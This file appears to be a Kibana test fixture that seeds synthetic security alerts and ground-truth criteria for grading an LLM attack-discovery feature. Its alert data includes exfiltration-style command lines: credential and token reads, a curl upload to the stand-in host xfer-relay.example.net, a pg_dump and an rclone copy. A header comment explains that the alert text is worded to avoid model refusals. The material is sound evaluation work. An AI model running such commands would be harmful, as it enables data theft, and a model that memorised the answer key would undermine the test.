/*
 * Copyright Elasticsearch B.V. and/or licensed to Elasticsearch B.V. under one
 * or more contributor license agreements. Licensed under the Elastic License
 * 2.0; you may not use this file except in compliance with the Elastic License
 * 2.0.
 */

import { createHash } from 'crypto';
import type { Client as EsClient } from '@elastic/elasticsearch';
import type { AttackDiscovery } from '@kbn/elastic-assistant-common';
import { ADHOC_DISCOVERIES_INDEX, ALERTS_INDEX } from './constants';

/**
 * A small, deliberately non-malware alert set: two true multi-stage intrusions (credential
 * access -> lateral movement -> exfiltration) built from benign-looking process names, one
 * decoy chain with the same rule names that is an approved backup job, and unrelated noise.
 * Model refusals on malware-flavoured alert text (empty completions) must not be mistaken for
 * "no attack found", so nothing here names a malware family, tool or sample.
 */

type ChainKey = 'exfil_windows' | 'exfil_linux' | 'backup_decoy' | 'noise';

interface SeedAlertSpec {
  key: string;
  chain: ChainKey;
  host: string;
  os: 'windows' | 'linux';
  user: string;
  ruleName: string;
  severity: 'low' | 'medium' | 'high' | 'critical';
  riskScore: number;
  minutesAgo: number;
  message: string;
  processName: string;
  commandLine: string;
}

const win = (
  spec: Omit<SeedAlertSpec, 'os' | 'host' | 'user'> & { host?: string; user?: string }
): SeedAlertSpec => ({ os: 'windows', host: 'FIN-WS-07', user: 'a.novak', ...spec });

const linux = (
  spec: Omit<SeedAlertSpec, 'os' | 'host' | 'user'> & { host?: string; user?: string }
): SeedAlertSpec => ({ os: 'linux', host: 'build-runner-03', user: 'svc-deploy', ...spec });

const noise = (n: number): SeedAlertSpec =>
  win({
    key: `noise_${n}`,
    chain: 'noise',
    host: `WS-GEN-${String(n).padStart(2, '0')}`,
    user: `user${n}`,
    ruleName: n % 2 === 0 ? 'Unusual Time for Logon' : 'Browser Extension Installed',
    severity: 'low',
    riskScore: 21,
    minutesAgo: 50 - n * 3,
    message: `Routine low-severity activity for user${n} on WS-GEN-${String(n).padStart(2, '0')}.`,
    processName: n % 2 === 0 ? 'winlogon.exe' : 'chrome.exe',
    commandLine: n % 2 === 0 ? 'winlogon.exe' : 'chrome.exe --enable-extensions',
  });

export const SEED_ALERT_SPECS: readonly SeedAlertSpec[] = [
  win({
    key: 'a1_cred',
    chain: 'exfil_windows',
    ruleName: 'Credential File Read by Unexpected Process',
    severity: 'high',
    riskScore: 73,
    minutesAgo: 58,
    message:
      'cmd.exe read the CI credentials file C:\\ProgramData\\ci\\credentials.json on FIN-WS-07, a finance workstation that never runs CI jobs.',
    processName: 'cmd.exe',
    commandLine: 'cmd.exe /c type C:\\ProgramData\\ci\\credentials.json',
  }),
  win({
    key: 'a2_lateral',
    chain: 'exfil_windows',
    ruleName: 'Remote Service Created on Another Host',
    severity: 'high',
    riskScore: 73,
    minutesAgo: 50,
    message:
      'sc.exe on FIN-WS-07 created a service on file server FIN-FS-02 using the account whose credentials were read minutes earlier.',
    processName: 'sc.exe',
    commandLine: 'sc.exe \\\\FIN-FS-02 create svcupd binPath= "cmd.exe /c robocopy"',
  }),
  win({
    key: 'a3_stage',
    chain: 'exfil_windows',
    ruleName: 'Large Data Staged from Network Share',
    severity: 'high',
    riskScore: 73,
    minutesAgo: 41,
    message:
      'robocopy.exe copied 4.2 GB from \\\\FIN-FS-02\\finance$ to C:\\Users\\Public\\stage on FIN-WS-07.',
    processName: 'robocopy.exe',
    commandLine: 'robocopy.exe \\\\FIN-FS-02\\finance$ C:\\Users\\Public\\stage /E',
  }),
  win({
    key: 'a4_exfil',
    chain: 'exfil_windows',
    ruleName: 'Large Outbound Transfer to Rare Destination',
    severity: 'critical',
    riskScore: 91,
    minutesAgo: 33,
    message:
      'curl.exe on FIN-WS-07 uploaded 4.1 GB to xfer-relay.example.net, a domain never seen in this environment before.',
    processName: 'curl.exe',
    commandLine: 'curl.exe -T C:\\Users\\Public\\stage.zip https://xfer-relay.example.net/up',
  }),
  linux({
    key: 'b1_cred',
    chain: 'exfil_linux',
    ruleName: 'Credential File Read by Unexpected Process',
    severity: 'high',
    riskScore: 73,
    minutesAgo: 55,
    message:
      'cat read /var/lib/ci/service-account-token on build-runner-03 outside any pipeline job window.',
    processName: 'cat',
    commandLine: 'cat /var/lib/ci/service-account-token',
  }),
  linux({
    key: 'b2_lateral',
    chain: 'exfil_linux',
    ruleName: 'Interactive Login to Production Database Host',
    severity: 'high',
    riskScore: 73,
    minutesAgo: 47,
    message:
      'svc-deploy opened an interactive session from build-runner-03 to db-prod-02. Build runners normally never log in interactively to production.',
    processName: 'ssh',
    commandLine: 'ssh svc-deploy@db-prod-02',
  }),
  linux({
    key: 'b3_dump',
    chain: 'exfil_linux',
    host: 'db-prod-02',
    ruleName: 'Bulk Database Export',
    severity: 'high',
    riskScore: 73,
    minutesAgo: 38,
    message: 'pg_dump exported the full customers database on db-prod-02 as svc-deploy.',
    processName: 'pg_dump',
    commandLine: 'pg_dump -h localhost -U svc-deploy customers -f /var/tmp/customers.sql.gz',
  }),
  linux({
    key: 'b4_exfil',
    chain: 'exfil_linux',
    host: 'db-prod-02',
    ruleName: 'Large Outbound Transfer to Rare Destination',
    severity: 'critical',
    riskScore: 91,
    minutesAgo: 29,
    message:
      'rclone on db-prod-02 uploaded customers.sql.gz to an unrecognized cloud storage remote, anon-remote.',
    processName: 'rclone',
    commandLine: 'rclone copy /var/tmp/customers.sql.gz anon-remote:archive',
  }),
  win({
    key: 'd1_cred',
    chain: 'backup_decoy',
    host: 'SRV-BKP-01',
    user: 'svc-backup',
    ruleName: 'Credential File Read by Unexpected Process',
    severity: 'medium',
    riskScore: 47,
    minutesAgo: 44,
    message:
      'bkpagent.exe read C:\\ProgramData\\backup\\credentials.json on SRV-BKP-01 during approved change window CHG-4417 (monthly backup job).',
    processName: 'bkpagent.exe',
    commandLine: 'bkpagent.exe --job monthly --change CHG-4417',
  }),
  win({
    key: 'd2_lateral',
    chain: 'backup_decoy',
    host: 'SRV-BKP-01',
    user: 'svc-backup',
    ruleName: 'Remote Service Created on Another Host',
    severity: 'medium',
    riskScore: 47,
    minutesAgo: 40,
    message:
      'sc.exe on SRV-BKP-01 reconfigured the backup service on SRV-BKP-02. Same account and schedule as every previous monthly job (CHG-4417).',
    processName: 'sc.exe',
    commandLine: 'sc.exe \\\\SRV-BKP-02 config bkpagent start= demand',
  }),
  win({
    key: 'd3_upload',
    chain: 'backup_decoy',
    host: 'SRV-BKP-01',
    user: 'svc-backup',
    ruleName: 'Large Outbound Transfer to Rare Destination',
    severity: 'medium',
    riskScore: 47,
    minutesAgo: 36,
    message:
      'bkpagent.exe uploaded 12 GB to the contracted backup vendor endpoint backup.vendor-corp.example.com under change CHG-4417.',
    processName: 'bkpagent.exe',
    commandLine:
      'bkpagent.exe --upload https://backup.vendor-corp.example.com/v1 --change CHG-4417',
  }),
  ...Array.from({ length: 12 }, (_, i) => noise(i + 1)),
];

/** Stable per alert key, so ground truth can name ids; runs are isolated by cleanup instead. */
export const alertIdForKey = (key: string): string => {
  const hex = createHash('sha256').update(`ad-generation-path:${key}`).digest('hex');
  return `${hex.slice(0, 8)}-${hex.slice(8, 12)}-4${hex.slice(13, 16)}-a${hex.slice(
    17,
    20
  )}-${hex.slice(20, 32)}`;
};

export const idsForChain = (chain: ChainKey): string[] =>
  SEED_ALERT_SPECS.filter((spec) => spec.chain === chain).map(({ key }) => alertIdForKey(key));

export const ALL_SEEDED_IDS: ReadonlySet<string> = new Set(
  SEED_ALERT_SPECS.map(({ key }) => alertIdForKey(key))
);

export const buildAlertDocument = (
  spec: SeedAlertSpec,
  runMarker: string,
  now: Date
): Record<string, unknown> => {
  const timestamp = new Date(now.getTime() - spec.minutesAgo * 60_000).toISOString();
  const alertId = alertIdForKey(spec.key);
  const ruleId = createHash('sha256').update(`rule:${spec.ruleName}`).digest('hex').slice(0, 32);
  return {
    '@timestamp': timestamp,
    ecs: { version: '9.0.0' },
    event: {
      kind: 'signal',
      category: ['intrusion_detection'],
      module: 'endpoint',
      dataset: 'endpoint.alerts',
      action: 'rule_detection',
      severity: spec.riskScore,
    },
    tags: [runMarker],
    labels: { ad_portable_seed: runMarker },
    host: { name: spec.host, os: { type: spec.os } },
    user: { name: spec.user },
    message: spec.message,
    process: { name: spec.processName, command_line: spec.commandLine },
    rule: { name: spec.ruleName, id: ruleId, description: spec.message },
    'kibana.alert.rule.category': 'Endpoint Behavior Detection',
    'kibana.alert.rule.consumer': 'siem',
    'kibana.alert.rule.producer': 'siem',
    'kibana.alert.rule.name': spec.ruleName,
    'kibana.alert.rule.rule_type_id': 'siem.eqlRule',
    'kibana.alert.rule.rule_id': ruleId,
    'kibana.alert.rule.uuid': ruleId,
    'kibana.alert.rule.description': spec.message,
    'kibana.alert.rule.severity': spec.severity,
    'kibana.alert.rule.risk_score': spec.riskScore,
    'kibana.alert.severity': spec.severity,
    'kibana.alert.risk_score': spec.riskScore,
    'kibana.alert.status': 'active',
    'kibana.alert.workflow_status': 'open',
    'kibana.alert.workflow_tags': [],
    'kibana.alert.workflow_assignee_ids': [],
    'kibana.alert.depth': 1,
    'kibana.alert.reason': spec.message,
    'kibana.alert.original_time': timestamp,
    'kibana.alert.building_block_type': null,
    'kibana.alert.uuid': alertId,
    'kibana.space_ids': ['default'],
  };
};

export const assertBulkOk = (
  label: string,
  result: { errors?: boolean; items?: unknown[] }
): void => {
  if (result.errors === true) {
    throw new Error(`${label} bulk had item errors: ${JSON.stringify(result.items)}`);
  }
};

const chainDiscovery = (
  chain: ChainKey,
  title: string,
  summaryMarkdown: string,
  tactics: string[]
): AttackDiscovery => ({
  title,
  alertIds: idsForChain(chain),
  summaryMarkdown,
  detailsMarkdown: summaryMarkdown,
  mitreAttackTactics: tactics,
  timestamp: new Date(0).toISOString(),
});

export const REFERENCE_DISCOVERIES: AttackDiscovery[] = [
  chainDiscovery(
    'exfil_windows',
    'Credential theft, lateral movement and data exfiltration from FIN-WS-07',
    'On FIN-WS-07, user a.novak read a CI credentials file, used the account to create a service on FIN-FS-02, staged 4.2 GB from the finance share and uploaded it to the never-before-seen domain xfer-relay.example.net.',
    ['Credential Access', 'Lateral Movement', 'Collection', 'Exfiltration']
  ),
  chainDiscovery(
    'exfil_linux',
    'Service-account token reuse leading to customer database exfiltration from db-prod-02',
    'On build-runner-03, svc-deploy read a CI service-account token, logged in interactively to db-prod-02, exported the customers database with pg_dump and uploaded it to an unrecognized cloud remote with rclone.',
    ['Credential Access', 'Lateral Movement', 'Collection', 'Exfiltration']
  ),
];

/** Natural-language ground truth for the LLM criteria evaluator. */
export const GROUND_TRUTH_CRITERIA: string[] = [
  'Reports one attack chain covering the FIN-WS-07 credential file read, the remote service on FIN-FS-02, the 4.2 GB share staging and the upload to xfer-relay.example.net',
  'Reports one attack chain covering the build-runner-03 token read, the interactive login to db-prod-02, the pg_dump export and the rclone upload to an unrecognized remote',
  'Keeps the two chains separate: no discovery merges FIN-WS-07 activity with build-runner-03 / db-prod-02 activity',
  'Does not report the SRV-BKP-01 / SRV-BKP-02 activity (approved backup job under change CHG-4417, bkpagent.exe, backup.vendor-corp.example.com) as part of an attack',
  'Does not build a discovery out of the unrelated low-severity WS-GEN-* alerts',
  'Every claim about hosts, users, processes and destinations is supported by the alerts; no invented hosts, users, domains or commands',
];

export interface SeededAlerts {
  runMarker: string;
  cleanup: () => Promise<void>;
}

/**
 * Indexes the fixture into the detection alerts index. The run marker tags every document so
 * cleanup removes only this run's. `executionUuids` (known only after the run) are used to
 * remove the ad hoc discoveries the run persisted.
 */
export const seedAlerts = async ({
  esClient,
  now = new Date(),
}: {
  esClient: EsClient;
  now?: Date;
}): Promise<SeededAlerts & { removeDiscoveries: (executionUuids: string[]) => Promise<void> }> => {
  const runMarker = `ad-generation-path-${now.getTime()}`;
  const operations = SEED_ALERT_SPECS.flatMap((spec) => [
    { index: { _index: ALERTS_INDEX, _id: alertIdForKey(spec.key) } },
    buildAlertDocument(spec, runMarker, now),
  ]);
  assertBulkOk(
    'Attack Discovery generation-path alert seed',
    await esClient.bulk({ operations, refresh: 'wait_for' })
  );

  return {
    runMarker,
    cleanup: async () => {
      await esClient.deleteByQuery({
        index: ALERTS_INDEX,
        query: { term: { 'labels.ad_portable_seed': runMarker } },
        refresh: true,
        conflicts: 'proceed',
        ignore_unavailable: true,
      });
    },
    removeDiscoveries: async (executionUuids) => {
      if (executionUuids.length === 0) {
        return;
      }
      await esClient.deleteByQuery({
        index: ADHOC_DISCOVERIES_INDEX,
        query: { terms: { 'kibana.alert.rule.execution.uuid': executionUuids } },
        refresh: true,
        conflicts: 'proceed',
        ignore_unavailable: true,
      });
    },
  };
};

/** Open alerts in the lookback window that this fixture did not seed. */
export const countForeignOpenAlerts = async (
  esClient: EsClient,
  lookback: string
): Promise<number> => {
  const { count } = await esClient.count({
    index: ALERTS_INDEX,
    ignore_unavailable: true,
    query: {
      bool: {
        filter: [
          { range: { '@timestamp': { gte: `now-${lookback}` } } },
          { terms: { 'kibana.alert.workflow_status': ['open', 'acknowledged'] } },
        ],
        must_not: [{ ids: { values: [...ALL_SEEDED_IDS] } }],
      },
    },
  });
  return count;
};
